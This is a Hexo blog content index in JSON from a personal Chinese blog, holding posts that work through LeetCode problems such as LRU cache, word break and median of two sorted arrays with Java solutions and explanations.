{"meta":{"title":"gwolfs的个人博客","subtitle":"","description":"","author":"gwolfs","url":"http://blog.ydq6.com","root":"/"},"pages":[{"title":"categories","date":"2020-04-30T13:34:01.000Z","updated":"2020-04-30T13:35:12.193Z","comments":true,"path":"categories/index.html","permalink":"http://blog.ydq6.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-05-01T06:53:25.000Z","updated":"2020-05-01T06:53:25.212Z","comments":true,"path":"about/index.html","permalink":"http://blog.ydq6.com/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-04-30T13:35:30.000Z","updated":"2020-04-30T13:35:56.646Z","comments":true,"path":"tags/index.html","permalink":"http://blog.ydq6.com/tags/index.html","excerpt":"","text":""},{"title":"schedule","date":"2020-05-01T11:57:57.000Z","updated":"2020-05-06T03:41:26.261Z","comments":true,"path":"schedule/index.html","permalink":"http://blog.ydq6.com/schedule/index.html","excerpt":"","text":"计划 此文档为记录当前正在做的工作。 2020年5月5日 SGX Tcounter项目 实验代码 web安全 逻辑漏洞总结"}],"posts":[{"title":"Leetcode238-除自身以外数组的乘积","slug":"Leetcode238-除自身以外数组的乘积","date":"2020-06-04T02:09:54.000Z","updated":"2020-06-04T03:38:55.024Z","comments":true,"path":"算法/Leetcode238-除自身以外数组的乘积/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode238-%E9%99%A4%E8%87%AA%E8%BA%AB%E4%BB%A5%E5%A4%96%E6%95%B0%E7%BB%84%E7%9A%84%E4%B9%98%E7%A7%AF/","excerpt":"给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。 示例: 输入: [1,2,3,4]输出: [24,12,8,6] 提示：题目数据保证数组之中任意元素的全部前缀元素和后缀（甚至是整个数组）的乘积都在 32 位整数范围内。 说明: 请不要使用除法，且在 O(n) 时间复杂度内完成此题。 进阶：你可以在常数空间复杂度内完成这个题目吗？（ 出于对空间复杂度分析的目的，输出数组不被视为额外空间。） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/product-of-array-except-self著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"给你一个长度为 n 的整数数组 nums，其中 n &gt; 1，返回输出数组 output ，其中 output[i] 等于 nums 中除 nums[i] 之外其余各元素的乘积。 示例: 输入: [1,2,3,4]输出: [24,12,8,6] 提示：题目数据保证数组之中任意元素的全部前缀元素和后缀（甚至是整个数组）的乘积都在 32 位整数范围内。 说明: 请不要使用除法，且在 O(n) 时间复杂度内完成此题。 进阶：你可以在常数空间复杂度内完成这个题目吗？（ 出于对空间复杂度分析的目的，输出数组不被视为额外空间。） 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/product-of-array-except-self著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 要求除本身外数组的乘积，只需要将数字左右的乘积相乘即可。假设 1dp[i][j]为nums[i]*nums[i+1]*...*nums[j]; 所以 1sums[i]=dp[0][i-1]*dp[i+1][len] 状态转移方程： 1dp[i][j]=dp[i][j-1]*nums[j] 方向是从0~len. 1234567891011121314151617181920public int[] productExceptSelf(int[] nums) &#123; int len = nums.length; int[][] dp = new int[len][len]; for(int i = 0;i &lt; len;i++)&#123; for(int j=i;j&lt;len;j++)&#123; if(j == i) &#123; dp[i][i] = nums[i]; &#125;else&#123; dp[i][j] = dp[i][j - 1] * nums[j]; &#125; &#125; &#125; int[] sum = new int[len]; sum[0]=dp[1][len-1]; sum[len-1]=dp[0][len-2]; for(int i = 1;i &lt; len-1;i++)&#123; sum[i] = dp[0][i-1]*dp[i+1][len-1]; &#125; return sum; &#125; 这样虽然对，但是超出内存限制了。题目要求o(1)时间复杂度，所以需要重新调整过。 看下状态转移方程表格： 再看下sum是怎么计算的： 可以重新算状态转移表格： 其实很简单的一个表格，用几个中间变量表示即可。 123456leftValue 代表左面计算乘积，初始化为1。rightValue 代表右面计算乘积，初始化为1.注意右面乘积的计算只需要从num[j+1]*...num[len-1]即可，但是左面计算乘积需要记录上一次的左面乘积，这样就可以防止重复计算。所以用lastLeftValue代表上次计算的左面乘积。则leftValue=lastLeftValue*nums[j-1] 所以最后的代码为： 12345678910111213141516171819202122int len = nums.length;int[] sum = new int[len];int lastLeftValue = 1;for(int i =0;i &lt; len;i++)&#123; int leftValue = 1; int rightValue = 1; if(i == 0)&#123; for(int j =i+1;j&lt;len;j++)&#123; rightValue *= nums[j]; &#125; &#125;else if(i == len-1)&#123; leftValue = lastLeftValue*nums[i-1]; &#125;else&#123; leftValue = lastLeftValue*nums[i-1]; lastLeftValue = leftValue; for(int j =i+1;j&lt;len;j++)&#123; rightValue *= nums[j]; &#125; &#125; sum[i] = leftValue*rightValue;&#125;return sum;","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Leetcode152-乘积最大子数组","slug":"Leetcode152-乘积最大子数组","date":"2020-06-03T03:17:50.000Z","updated":"2020-06-04T01:54:35.542Z","comments":true,"path":"算法/Leetcode152-乘积最大子数组/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode152-%E4%B9%98%E7%A7%AF%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/","excerpt":"给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。 示例 1: 输入: [2,3,-2,4]输出: 6解释: 子数组 [2,3] 有最大乘积 6。示例 2: 输入: [-2,0,-1]输出: 0解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-product-subarray著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"给你一个整数数组 nums ，请你找出数组中乘积最大的连续子数组（该子数组中至少包含一个数字），并返回该子数组所对应的乘积。 示例 1: 输入: [2,3,-2,4]输出: 6解释: 子数组 [2,3] 有最大乘积 6。示例 2: 输入: [-2,0,-1]输出: 0解释: 结果不能为 2, 因为 [-2,-1] 不是子数组。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-product-subarray著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 假设dp[j] 为从以nums[j]结尾的最大的乘积和 分析一下，其实 1234dp[j] 和[j-1]无关e.g. a=[1,-2,3,-4]dp[2]=3dp[3]=24 对于当前数num=nums[j]。 若num&gt;0。则希望乘一个最大的整数 若num&lt;0，则希望乘一个最小的负数。 所以对于dp[j]应该维护两个数组，最大正数数组dpmax，最小负数数组min。 $$ dpmax[j] = max(dpmax[j-1]nums[j],dpmin[j-1]nums[j],nums[j])$$$$ dpmin[j] = min(dpmax[j-1]nums[j],dpmin[j-1]nums[j],nums[j])$$ 再简化一下用两个变量dpmax,dpmin节省空间复杂度： $$dpmax=max(dpmaxnums[j],dpminnums[j],nums[j])$$ $$ dpmin = min(dpmaxnums[j],dpminnums[j],nums[j])$$ 用maxValue记录最大值。 如果dpmax&gt;maxValue则，更新最大值。 代码： 12345678910111213141516public int maxProduct(int[] nums) &#123; int dpmax,dpmin,maxValue; dpmax = nums[0]; dpmin = nums[0]; maxValue = dpmax; for(int i = 1;i &lt; nums.length;i++)&#123; int tmpValue1 = dpmax*nums[i]; int tmpValue2 = dpmin*nums[i]; dpmax = Math.max(Math.max(tmpValue1,tmpValue2),nums[i]); dpmin = Math.min(Math.min(tmpValue1,tmpValue2),nums[i]); if(dpmax&gt;maxValue)&#123; maxValue = dpmax; &#125; &#125; return maxValue; &#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Leetcode974-和可被K整除的子数组","slug":"Leetcode974-和可被K整除的子数组","date":"2020-05-27T01:25:07.000Z","updated":"2020-05-27T02:59:15.943Z","comments":true,"path":"uncategorized/Leetcode974-和可被K整除的子数组/","link":"","permalink":"http://blog.ydq6.com/uncategorized/Leetcode974-%E5%92%8C%E5%8F%AF%E8%A2%ABK%E6%95%B4%E9%99%A4%E7%9A%84%E5%AD%90%E6%95%B0%E7%BB%84/","excerpt":"给定一个整数数组 A，返回其中元素之和可被 K 整除的（连续、非空）子数组的数目。 示例： 输入：A = [4,5,0,-2,-3,1], K = 5输出：7解释：有 7 个子数组满足其元素之和可被 K = 5 整除：[4, 5, 0, -2, -3, 1], [5], [5, 0], [5, 0, -2, -3], [0], [0, -2, -3], [-2, -3] 提示： 1 &lt;= A.length &lt;= 30000 -10000 &lt;= A[i] &lt;= 10000 2 &lt;= K &lt;= 10000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/subarray-sums-divisible-by-k著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"给定一个整数数组 A，返回其中元素之和可被 K 整除的（连续、非空）子数组的数目。 示例： 输入：A = [4,5,0,-2,-3,1], K = 5输出：7解释：有 7 个子数组满足其元素之和可被 K = 5 整除：[4, 5, 0, -2, -3, 1], [5], [5, 0], [5, 0, -2, -3], [0], [0, -2, -3], [-2, -3] 提示： 1 &lt;= A.length &lt;= 30000 -10000 &lt;= A[i] &lt;= 10000 2 &lt;= K &lt;= 10000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/subarray-sums-divisible-by-k著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 这道题是求连续非空子数组和的问题，所以可以想到用前缀数组和问题，前缀数组： $$preSum[i-1]=A[0]+A[1]+…+A[i-1]$$ $$preSum[j]=A[0]+A[1]+…A[j]$$ 所以：非空子数组[i,j]和为： $$preSum[j]-preSum[i-1]=A[i]+A[i+2]+…+A[j] i&lt;=j$$ 特殊的非空子数组[0,j]的和为 $$ preSum[j]=A[0]+A[1]+…A[j]$$. 所以问题转化为求i,j试得其满足$$(preSum[j]-preSum[i])$k==0$$ 而 $$ presum[i]=\\begin{cases}A[0],\\quad i=0\\presum[i-1]+A[i],\\quad i\\geq 1 \\end{cases}$$ 所以先用O(n)求出preSum[i],然后用o(n**2)求出preSum[j]-preSum[i]即可。 空间复杂度为O(n)。 12345678910111213141516171819202122232425public int subarraysDivByK(int[] A, int K) &#123; if(A.length == 0)&#123; return 0; &#125; int[] preSum = new int[A.length]; preSum[0] = A[0]; for(int i=1;i&lt;A.length;i++)&#123; preSum[i] = preSum[i-1] + A[i]; &#125; int sum = 0; for(int i=0;i&lt;A.length;i++)&#123; for(int j=i;j&lt;A.length;j++)&#123; if(i == 0) &#123; if (preSum[j] % K == 0) &#123; sum++; &#125; &#125;else&#123; if((preSum[j]-preSum[i-1])%K==0)&#123; sum++; &#125; &#125; &#125; &#125; return sum; &#125; 但是这样做超时了。 再思考下，其实这和两数和题相似，实则是两数差问题，遍历一次即可，两数差modK==0。其实将数hash后看下map中是否有相同的值，有即找出一对差。 遍历时，先看下map中有没有自己需要的值presum[i] mod K。如果有则计算出有多少个需要的，然后再map[presum[i] mod K]++。如果没有自己需要的值，则将自己的hash值放入:map[presum[i] mod K] = 1。 除此之外，还有一种特殊情况：加上本身modK等于0的preSum数量。","categories":[],"tags":[]},{"title":"Leetcode139-单词拆分","slug":"Leetcode139-单词拆分","date":"2020-05-26T02:13:10.000Z","updated":"2020-05-26T03:25:21.900Z","comments":true,"path":"算法/Leetcode139-单词拆分/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode139-%E5%8D%95%E8%AF%8D%E6%8B%86%E5%88%86/","excerpt":"给定一个非空字符串 s 和一个包含非空单词列表的字典 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。 说明： 拆分时可以重复使用字典中的单词。你可以假设字典中没有重复的单词。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/word-break著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"给定一个非空字符串 s 和一个包含非空单词列表的字典 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。 说明： 拆分时可以重复使用字典中的单词。你可以假设字典中没有重复的单词。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/word-break著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 方法一、分治法 这个问题可以用分治法来解决，分治法的关键在于划分子问题。 分治三步：分解-&gt;解决-&gt;合并 分解：假设字符串为s长度为len。分解点为j（1-len-1），子问题：s[0,j) 、s[j,len)。 解决： 对于每一个子问题s。如果s在wordDict中，则返回true，否则分解为子问题继续查找。 合并：两个子问题均为true才能为true。对于j从0-len，如果存在一个j，则结果返回true. 12345678910111213public boolean wordBreak(String s, List&lt;String&gt; wordDict) &#123; if(wordDict.contains(s))&#123; return true; &#125; for(int j=1;j&lt;s.length();j++)&#123; boolean res1 = wordBreak(s.substring(0,j),wordDict); boolean res2 = wordBreak(s.substring(j),wordDict); if(res1&amp;&amp;res2)&#123; return true; &#125; &#125; return false; &#125; 这种分治法有很多子问题重叠，所以需要优化，可以利用HashMap来记忆化搜索。 1234567891011121314151617181920HashMap&lt;String,Boolean&gt; hashMap = new HashMap&lt;&gt;(); public boolean wordBreak(String s, List&lt;String&gt; wordDict) &#123; if(hashMap.containsKey(s))&#123; return hashMap.get(s); &#125; if(wordDict.contains(s))&#123; hashMap.put(s,true); return true; &#125; for(int j=1;j&lt;s.length();j++)&#123; boolean res1 = wordBreak(s.substring(0,j),wordDict); boolean res2 = wordBreak(s.substring(j),wordDict); if(res1&amp;&amp;res2)&#123; hashMap.put(s,true); return true; &#125; &#125; hashMap.put(s,false); return false; &#125; 方法二、动态规划方法： 设dp[i]为从第0点到第i点的字符串是否满足要求。注意dp[0]=0。因为空字符串一定在单词列表中。 转移方程：","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Leetcode287-寻找重复数","slug":"Leetcode287-寻找重复数","date":"2020-05-26T00:55:44.000Z","updated":"2020-05-26T02:10:54.018Z","comments":true,"path":"uncategorized/Leetcode287-寻找重复数/","link":"","permalink":"http://blog.ydq6.com/uncategorized/Leetcode287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/","excerpt":"给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。 说明： 不能更改原数组（假设数组是只读的）。只能使用额外的 O(1) 的空间。时间复杂度小于 O(n**2) 。数组中只有一个重复的数字，但它可能不止重复出现一次。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-the-duplicate-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。 说明： 不能更改原数组（假设数组是只读的）。只能使用额外的 O(1) 的空间。时间复杂度小于 O(n**2) 。数组中只有一个重复的数字，但它可能不止重复出现一次。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-the-duplicate-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 方案一、不考虑题目要求可以直接用一个hash表（Map）来存储映射，找到重复的即可，时间复杂度O(n),空间复杂度O(n)。 方案二、如果考虑题目要求空间复杂度为O(1)，时间复杂度小于o(n**2)。可以先用o(nlogn)的排序，再遍历一遍数组，遍历时找到与后面个数相等的数即可。 但是注意题目有个要求，不能更改原数组，所以排序方案不可行。再看看题目，n+1个整数的数组，数字都在1-n之间，可以想着鸽巢原理，鸽巢原理也可以转化为有向图。 数组转有向图：i指向(nums[i])。 假设数组为[1,3,4,2,2]。链表如下所示。 可以推断出存在重复数的点，入度大于等于2。但是不一定只存在一个环。如下图所示： 图是由0—k个强联通子图+一个循环链表构成。 所以我们首先把图中强连通子图排除掉就剩下一个循环链表，循环链表的入口点索引即为重复数组。 强连通子图也是一个循环链表，这里有个比较巧的方法就是判定环的入口点是否有两个或以上前驱点即可。用快慢指针方法可以判断循环链表入口点。 我们再注意一个问题，从索引0位置出发所构成的子图一定不是强连通子图，因为一定不存在nums[i]=0。所以从索引0出发一定能找到循环链表，且该循环链表的入口点一定为环入口点。 代码： 12345678910111213141516171819public int findDuplicate(int[] nums) &#123; if(nums.length&lt;2)&#123; return 0; &#125; int slow=0; int fast=0; slow = nums[slow]; fast = nums[nums[fast]]; while(slow != fast)&#123; slow = nums[slow]; fast = nums[nums[fast]]; &#125; int slow2 = 0; while(slow2 != slow)&#123; slow = nums[slow]; slow2 = nums[slow2]; &#125; return slow;&#125;","categories":[],"tags":[]},{"title":"Leetcode146-LRU缓存机制","slug":"Leetcode146-LRU缓存机制","date":"2020-05-25T01:30:45.000Z","updated":"2020-05-25T03:16:39.002Z","comments":true,"path":"算法/Leetcode146-LRU缓存机制/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode146-LRU%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/","excerpt":"运用你所掌握的数据结构，设计和实现一个 LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。 获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。写入数据 put(key, value) - 如果密钥已经存在，则变更其数据值；如果密钥不存在，则插入该组「密钥/数据值」。当缓存容量达到上限时，它应该在写入新数据之前删除最久未使用的数据值，从而为新的数据值留出空间。 进阶: 你是否可以在 O(1) 时间复杂度内完成这两种操作？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lru-cache著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"运用你所掌握的数据结构，设计和实现一个 LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。 获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。写入数据 put(key, value) - 如果密钥已经存在，则变更其数据值；如果密钥不存在，则插入该组「密钥/数据值」。当缓存容量达到上限时，它应该在写入新数据之前删除最久未使用的数据值，从而为新的数据值留出空间。 进阶: 你是否可以在 O(1) 时间复杂度内完成这两种操作？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/lru-cache著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 首先，LRU设计三个操作，初始化（选择数据结构），写入数据，获取数据。 分析写入数据。不存在，则插入数组。这里可以看出可以是尾插，也可以是任意位置插。容量达到上限时，还应该删除最久未使用的，所以每个数据应该还有个标志位，标志最近访问时间。 先构造一个未优化的LRU。用HashMap+LinkedList实现。 其中HashMap作为字典。LinkedList作为最近访问列表。 注意HashMap的底层数据结构为数组+链表+红黑树 LinkerList的底层数据结构为双向链表（双向队列）。 123456789101112131415161718192021222324252627282930313233343536public class LRUCache &#123; HashMap&lt;Integer,Integer&gt; map; LinkedList&lt;Integer&gt; accessList; int capacity; public LRUCache(int capacity) &#123; this.capacity = capacity; accessList = new LinkedList&lt;&gt;(); map = new HashMap&lt;&gt;(); &#125; public int get(int key) &#123; Integer value = map.get(key); if(value == null)&#123; return -1; &#125; accessList.remove(new Integer(key)); accessList.add(key); //System.out.printf(\"key:%d,value:%d\\n\",key,value); return value; &#125; public void put(int key, int value) &#123; Integer oValue = map.get(key); if(oValue == null)&#123; if(map.size() &gt;= capacity)&#123; int headKey = accessList.pop(); map.remove(headKey); &#125; map.put(key,value); &#125;else&#123; map.put(key,value); accessList.remove(new Integer(key)); &#125; accessList.add(key); &#125;&#125; 时间复杂度分析: get方法 accessList.remove 带来o(n)的复杂度。总复杂度o(n) put方法 accessList.remove 带来o(n)的复杂度。总复杂度o(n) 优化后的方法在Java中有一个数据结构为LinkedHashMap。其即包含HashMap，又包含双向链表。直接利用： 123456789101112131415161718192021import java.util.LinkedHashMap;import java.util.Map;class LRUCache extends LinkedHashMap&lt;Integer,Integer&gt;&#123; int capacity; public LRUCache(int capacity) &#123; super(16,0.75f,true); this.capacity = capacity; &#125; public int get(int key)&#123; Integer value = super.get(key); if(value == null)&#123; return -1; &#125;else&#123; return value; &#125; &#125; @Override protected boolean removeEldestEntry(Map.Entry&lt;Integer,Integer&gt; eldest)&#123; return this.capacity &lt; this.size(); &#125;&#125; 注意一个点LinkedHashMap初始化时一定要把accessOrder属性执行为true,这样才会根据时间顺序排序。removeEldestEntry方法为移除最老的结点，在每次插入结点后调用。","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Leetcode4-寻找两个正序数组的中位数","slug":"Leetcode4-寻找两个正序数组的中位数","date":"2020-05-24T01:45:53.000Z","updated":"2020-05-24T07:44:02.578Z","comments":true,"path":"算法/Leetcode4-寻找两个正序数组的中位数/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode4-%E5%AF%BB%E6%89%BE%E4%B8%A4%E4%B8%AA%E6%AD%A3%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/","excerpt":"给定两个大小为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。 请你找出这两个正序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。 你可以假设 nums1 和 nums2 不会同时为空。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/median-of-two-sorted-arrays著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"给定两个大小为 m 和 n 的正序（从小到大）数组 nums1 和 nums2。 请你找出这两个正序数组的中位数，并且要求算法的时间复杂度为 O(log(m + n))。 你可以假设 nums1 和 nums2 不会同时为空。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/median-of-two-sorted-arrays著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 注意本题讨论时数组起始位规定为1，编程时才将起始位转化为0。 一、nums1的数组长度为m，nums2的数组长度为n。假设总长m+n=L。 ，将问题简化为求第k大的数即可。 如果L为偶数，则应该求第k=L/2和第k+1=L/2+1位开始的数（从1开始）。 如果L为奇数，则应该求第k=(L+1)/2个数。 二、两个数组求第k大数。 我们采用排除法，每次除去一半比第k个数小的数即可。 假设当前求第k大数，当前数组1长度为len1,数组2长度为len1。则k&lt;=max(len1,len2)，令ktmp = k//2 。 （1）ktmp &lt;=len1且ktmp &lt;=len2时： 比较nums1[ktmp]和nums2[ktmp]。 谁小左边数就可以排除。这样就可以排除一半的数。 剩下找第k=k-k//2大数即可。 （2）ktmp &gt;len1且ktmp &lt;=len2 比较nums1[len1]和nums2[ktmp]。 nums1[len1] &gt;= nums2[ktmp] 排除掉nums2的ktmp左边数。剩下找第k=k-k//2大数即可。 nums1[len1] &lt; nums2[ktmp] 除去nums1数组，nums2寻找第(k-len1)个数即可 （3）ktmp&lt;=len1且ktmp&gt;len2 比较nums1[ktmp]和nums2[len2]。 nums1[ktmp] &gt;= nums2[len2] 排除掉nums1的ktmp左边数。剩下找第k=k-k//2大数即可。 nums1[ktmp] &lt; nums2[len2] 除去nums2数组，nums1寻找第(k-len2)个数即可 特殊情况： 如果k=1时，不需排除一半，直接找即可。 第k+1个数只需在第k个数后面再找一个数即可。当把第k+1大的数前面的数都排除了. （1）剩下两个数组时，比较两个数组的头谁最小 （2）剩下一个数组时，取数组头即可。 这里归纳一下：可以将nums1和nums2，第k大数前面的所有数剔除。 这样只需将nums1中前两个数字和nums2中前两个数字做运算即可。 12345678910111213141516171819202122232425262728293031323334353637ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;();if(begin1 &lt; nums1.length)&#123; list.add(nums1[begin1]);&#125;if(begin1 + 1 &lt; nums1.length)&#123; list.add(nums1[begin1+1]);&#125;if(begin2 &lt; nums2.length)&#123; list.add(nums2[begin2]);&#125;if(begin2 + 1 &lt; nums2.length)&#123; list.add(nums2[begin2+1]);&#125;try &#123; int minValue = list.get(0); int minIndex = 0; for (int i = 1; i &lt; list.size(); i++) &#123; if (list.get(i) &lt; minValue) &#123; minValue = list.get(i); minIndex = i; &#125; &#125; int secondMinValue; if (minIndex != 0) &#123; secondMinValue = list.get(0); &#125; else &#123; secondMinValue = list.get(1); &#125; for (int i = 1; i &lt; list.size(); i++) &#123; if (i != minIndex &amp;&amp; list.get(i) &lt; secondMinValue) &#123; secondMinValue = list.get(i); &#125; &#125; return (minValue + secondMinValue) / 2.0;&#125;catch (Exception e)&#123; return 0;&#125; 所有代码（未优化前）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113public int realIndex(int begin,int index)&#123; return begin + (index -1); &#125; public double findMedianSortedArrays(int[] nums1, int[] nums2) &#123; int L = nums1.length+nums2.length; int k; boolean isEven = false; if(L%2==0)&#123; k = L / 2; isEven = true; &#125;else&#123; k = (L+1) / 2; &#125; int begin1 = 0; int begin2 = 0; int len1 = nums1.length; int len2 = nums2.length; int ktmp; while (k &gt; 1)&#123; ktmp = k / 2; if(len1 == 0)&#123; begin2 = begin2 + k - 1; len2 = nums2.length - begin2; k=1; break; &#125; else if(len2 == 0)&#123; begin1 = begin1 + k - len2 - 1; len1 = nums1.length - begin1; k=1; break; &#125; else if(ktmp &lt;= len1 &amp;&amp; ktmp &lt;= len2)&#123; if(nums1[realIndex(begin1,ktmp)] &gt;= nums2[realIndex(begin2,ktmp)])&#123; begin2 = begin2 + ktmp; len2 = nums2.length - begin2; &#125;else&#123; begin1 = begin1 + ktmp; len1 = nums1.length - begin1; &#125; &#125;else if(ktmp &gt; len1 &amp;&amp; ktmp &lt;= len2)&#123; if(nums1[realIndex(begin1,len1)] &gt;= nums2[realIndex(begin2,ktmp)])&#123; begin2 = begin2 + ktmp; len2 = nums2.length - begin2; &#125;else&#123; begin2 = begin2 + k - len1 - 1; begin1 = len1; len1 = 0; len2 = nums2.length - begin2; k=1; break; &#125; &#125;else if(ktmp &lt;= len1 &amp;&amp; ktmp &gt; len2) &#123; if(nums1[realIndex(begin1,ktmp)] &lt;= nums2[realIndex(begin2,len2)]) &#123; begin1 = begin1 + ktmp; len1 = nums1.length - begin1; &#125;else&#123; begin1 = begin1 + k - len2 - 1; begin2 = len2; len2 = 0; len1 = nums1.length - begin1; k=1; break; &#125; &#125; k = k - ktmp; &#125; if(!isEven)&#123; if(begin1 &gt;= nums1.length || ((begin2 &lt; nums2.length) &amp;&amp; (nums1[begin1] &gt;= nums2[begin2])) )&#123; return nums2[begin2]; &#125;else&#123; return nums1[begin1]; &#125; &#125;else &#123; ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); if(begin1 &lt; nums1.length)&#123; list.add(nums1[begin1]); &#125; if(begin1 + 1 &lt; nums1.length)&#123; list.add(nums1[begin1+1]); &#125; if(begin2 &lt; nums2.length)&#123; list.add(nums2[begin2]); &#125; if(begin2 + 1 &lt; nums2.length)&#123; list.add(nums2[begin2+1]); &#125; try &#123; int minValue = list.get(0); int minIndex = 0; for (int i = 1; i &lt; list.size(); i++) &#123; if (list.get(i) &lt; minValue) &#123; minValue = list.get(i); minIndex = i; &#125; &#125; int secondMinValue; if (minIndex != 0) &#123; secondMinValue = list.get(0); &#125; else &#123; secondMinValue = list.get(1); &#125; for (int i = 1; i &lt; list.size(); i++) &#123; if (i != minIndex &amp;&amp; list.get(i) &lt; secondMinValue) &#123; secondMinValue = list.get(i); &#125; &#125; return (minValue + secondMinValue) / 2.0; &#125;catch (Exception e)&#123; return 0; &#125; &#125; &#125; 总结:这道题一定要考虑细节处理，以及很多特殊用例。","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"数组","slug":"数组","permalink":"http://blog.ydq6.com/tags/%E6%95%B0%E7%BB%84/"}]},{"title":"Leetcode142_环形链表_II","slug":"Leetcode142-环形链表-II","date":"2020-05-23T09:30:31.000Z","updated":"2020-05-24T01:46:46.783Z","comments":true,"path":"算法/Leetcode142-环形链表-II/","link":"","permalink":"http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8-II/","excerpt":"题目说明： 给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 说明：不允许修改给定的链表。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/linked-list-cycle-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。","text":"题目说明： 给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。 说明：不允许修改给定的链表。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/linked-list-cycle-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 